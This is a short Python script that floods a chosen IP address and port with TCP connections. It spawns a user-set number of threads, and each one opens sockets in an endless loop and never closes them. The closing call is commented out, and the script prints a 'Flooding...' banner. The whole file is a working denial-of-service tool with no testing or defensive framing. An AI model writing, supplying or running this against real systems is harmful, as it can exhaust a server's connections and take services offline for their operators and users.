import socket
import sys
import threading
import time

if len(sys.argv) != 4:
    print("Usage: python3 script.py <IP> <PORT> <THREAD_NUM>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
thread_num = int(sys.argv[3])

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(100)
            s.connect((target_ip, target_port))
            # s.close()
        except Exception as e:
            pass

threads = []
for _ in range(thread_num):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    threads.append(t)

print("[*] Threads created!")
print("[*] Flooding... [CTRL+C]")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[-] Stopped")
